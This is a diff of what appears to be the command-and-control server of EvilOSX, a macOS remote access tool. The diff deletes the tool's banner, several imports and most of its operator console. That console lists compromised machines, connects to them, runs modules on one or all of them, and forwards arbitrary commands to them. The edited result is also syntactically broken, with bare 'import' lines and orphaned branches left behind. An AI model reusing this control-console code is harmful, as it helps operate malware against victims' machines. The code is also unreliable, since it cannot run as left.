@@ -17,19 +17,10 @@ import os
 import time
 import fnmatch
 import imp
-import base64
-import textwrap
-import shutil
+import
+import 
+import 
 from sys import exit
-
-BANNER = """\
-  ______       _  _   ____    _____ __   __
- |  ____|     (_)| | / __ \  / ____|\ \ / /
- | |__ __   __ _ | || |  | || (___   \ V / 
- |  __|\ \ / /| || || |  | | \___ \   > <  
- | |____\ V / | || || |__| | ____) | / . \ 
- |______|\_/  |_||_| \____/ |_____/ /_/ \_\\ @{0}
-""".format(__author__)
 
 MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
@@ -231,81 +222,6 @@ class ClientController(BaseHTTPRequestHandler):
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
-
-
-class View:
-    """This class interacts with the user."""
-
-    def __init__(self, model, modules):
-        self._model = model
-        self._modules = modules
-        self._current_client = None
-
-    def run(self):
-        """The main view program loop."""
-        print MESSAGE_INFO + "Server started, waiting for connections..."
-        print MESSAGE_INFO + "Type \"help\" to get a list of available commands."
-
-        while True:
-            if not self._current_client:
-                command = raw_input("> ").lower()
-            else:
-                # Client connected, show fancy prompt.
-                self._current_client = self._model.get_client(self._current_client.id)  # Update the session.
-
-                if self._current_client is None:  # The client was removed (via remove_client etc).
-                    command = raw_input("> ").lower()
-                else:
-                    _green = "\033[92m"
-                    _blue = "\033[94m"
-                    _endc = "\033[0m"
-
-                    command = raw_input((_green + "{0}@{1}" + _endc + ":" + _blue + "{2}" + _endc + "$ ").format(
-                        self._current_client.username, self._current_client.hostname, self._current_client.path)
-                    )
-
-            if command.strip() == "":
-                continue
-
-            if command == "help":
-                print "help             -   Show this help menu."
-                print "clients          -   Show a list of clients."
-                print "connect <ID>     -   Connect to the client."
-                print "modules          -   Show a list of available modules."
-                print "use <module>     -   Run the module on the client."
-                print "useall <module>  -   Run the module on every client."
-                if not self._current_client:
-                    print "exit             -   Close the server and exit."
-                else:
-                    print "exit             -   Stop interacting with client."
-                print "Any other command will be run on the client."
-            elif command == "clients":
-                clients = self._model.get_clients()
-
-                if not clients:
-                    print MESSAGE_ATTENTION + "No available clients."
-                else:
-                    print MESSAGE_INFO + str(len(clients)) + " client(s) available:"
-
-                    for i, client in enumerate(clients):
-                        print "    {0} = {1}@{2} ({3})".format(str(i), client.username,
-                                                               client.hostname, client.remote_ip)
-            elif command.startswith("connect"):
-                try:
-                    specified_id = int(command.split(" ")[1])
-                    self._current_client = self._model.get_clients()[specified_id]
-
-                    print MESSAGE_INFO + "Connected to \"{0}@{1}\", ready to send commands.".format(
-                        self._current_client.username, self._current_client.hostname
-                    )
-                except (IndexError, ValueError):
-                    print MESSAGE_ATTENTION + "Invalid client ID (see \"clients\")."
-                    print MESSAGE_ATTENTION + "Usage: connect <ID>"
-            elif command == "modules":
-                for module_name, module_imp in self._modules.get_modules().iteritems():
-                    if module_name == "helpers":
-                        continue
-
                     print "{0: <18} -   {1}".format(module_name, module_imp.info["Description"])
             elif command == "exit" and not self._current_client:
                 print MESSAGE_INFO + "Goodbye!"
